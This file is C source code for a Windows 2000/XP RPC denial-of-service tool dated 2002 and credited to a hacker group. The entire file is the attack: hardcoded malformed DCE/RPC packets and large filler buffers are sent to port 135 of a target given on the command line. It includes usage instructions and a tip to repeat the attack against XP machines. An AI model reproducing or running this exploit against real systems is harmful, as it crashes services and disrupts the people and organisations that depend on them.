/*
************************************************************************
* MS WIN RPC DoS CODE FROM SPIKE v2.7
* 
* Compile it use:
* cl winnuke.c
*
* Usage:
* winnuke targetip   
*
* Code by lion, Welcomde to HUC Website Http://www.cnhonker.com
* 2002/10/22
************************************************************************
*/

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char sendcode1[] = 
	"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x02\x00\x00\x00"
	"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
	"\x60\x9e\xe7\xb9\x52\x3d\xce\x11\xaa\xa1\x00\x00\x69\x01\x29\x3f"
	"\x02\x00\x02\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
	"\x2b\x10\x48\x60\x02\x00\x00\x00\x05\x00\x00\x01\x10\x00\x00\x00"
	"\xd0\x16\x00\x00\x8f\x00\x00\x00\x20\x27\x01\x00\x00\x00\x02\x00"
	"\xf0\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x00\x00";

char sendcode2[] = 
	"\x88\x13\x00\x00\x00\x00\x00\x00\x88\x13\x00\x00";

char sendcode3[] = 
	"\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00";

char sendcode4[] = 
	"\xfe\xff\x00\x00\x00\x00\x00\x00\xfe\xff\x00\x00\x3d\x3d\x3d\x3d" 
	"\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d"
	"\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
	"\x50\x10\x01\x00\x00\x00\x02\x00";

char sendcode5[] = 
	"\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
	"\x80\xf9\x00\x00\x00\x00\x02\x00";

char sendcode6[] = 
	"\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
	"\xb0\xe2\x00\x00\x00\x00\x02\x00";

char sendcode7[] = 
	"\x05\x00\x00\x02\x10\x00\x00\x00\x60\x15\x00\x00\x8f\x00\x00\x00"
	"\x60\x15\x00\x00\x00\x00\x02\x00";

char sendcode8[] = 
	"\x00\x00\x01\x10\x00\x00\x00\x00\x00\x00\x01\x10\x00\x00";

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	WORD wVersionRequested;
	struct hostent 		*pTarget;
	struct sockaddr_in 	sock;
	char *targetip;
	int port,bufsize;
	SOCKET s;
	char buffer[20480];

	printf("========================= HUC Win2000/XP RPC Nuke V0.10 =======================\r\n");
	printf("================= By Lion, Welcome to http://www.cnhonker.com =================\r\n\n");

	if (argc < 2)
	{
		printf("Usage:\r\n");
		printf("    %s <TargetIP> [TargetPort]\r\n", argv[0]);
		printf("Example:\r\n");
		printf("    %s 192.168.0.1\r\n", argv[0]);
		printf("    %s 192.168.0.1 135\r\n", argv[0]);
		printf("PS:\r\n");
		printf("    If target is XP, try 2 times.\r\n");
		exit(1);
	}

	wVersionRequested = MAKEWORD(1, 1);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

	targetip = argv[1];
	port = 135;
	if (argc >= 3) port = atoi(argv[2]);
	bufsize = 512;
	if (argc >= 4) bufsize = atoi(argv[3]);

	s = socket(AF_INET, SOCK_STREAM, 0);
	if(s==INVALID_SOCKET)
	{	
		printf("Socket error!\r\n");
		exit(1);
	}

	printf("Resolving Hostnames...\n");
	if ((pTarget = gethostbyname(targetip)) == NULL)
	{
		printf("Resolve of %s failed, please try again.\n", argv[1]);
		exit(1);
	}

	memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons((USHORT)port);

	printf("Connecting...\n");
	if ( (connect(s, (struct sockaddr *)&sock, sizeof (sock) )))
	{
		printf("Couldn't connect to host.\n");
		exit(1);
	}

	printf("Connected!...\n");
	printf("Sending Packets...\n");
	if (send(s, sendcode1, sizeof(sendcode1)-1, 0) == -1)
	{
		printf("Error sending nuke Packets\r\n");
		closesocket(s);
		exit(1);
	}

	memset(&buffer, '\x41', 240);
	send(s, buffer, 240, 0);

	send(s, sendcode2, sizeof(sendcode2)-1, 0);
	memset(&buffer, '\x42', 5000);
	send(s, buffer, 5000, 0);

	send(s, sendcode3, sizeof(sendcode3)-1, 0);
	memset(&buffer, '\x43', 512);
	send(s, buffer, 512, 0);
	
	send(s, sendcode4, sizeof(sendcode4)-1, 0);
//	memset(&buffer, '\x44', 20480);
//	send(s, buffer, 20480, 0);

//	/*
	memset(&buffer, '\x44', 5000);
	send(s, buffer, 5000, 0);

	send(s, sendcode5, sizeof(sendcode5)-1, 0);
	memset(&buffer, '\x45', 5000);
	send(s, buffer, 5000, 0);

	send(s, sendcode6, sizeof(sendcode6)-1, 0);
	memset(&buffer, '\x46', 5000);
	send(s, buffer, 5000, 0);

	send(s, sendcode7, sizeof(sendcode7)-1, 0);
	memset(&buffer, '\x47', 5000);
	send(s, buffer, 5000, 0);

	send(s, sendcode8, sizeof(sendcode8)-1, 0);
	memset(&buffer, '\x48', 5000);
	send(s, buffer, 5000, 0);
	
//	*/ 
	printf("Nuked! \r\nIf target is XP, try a again! :)\r\n");
	closesocket(s);
	WSACleanup();
	return 0;
}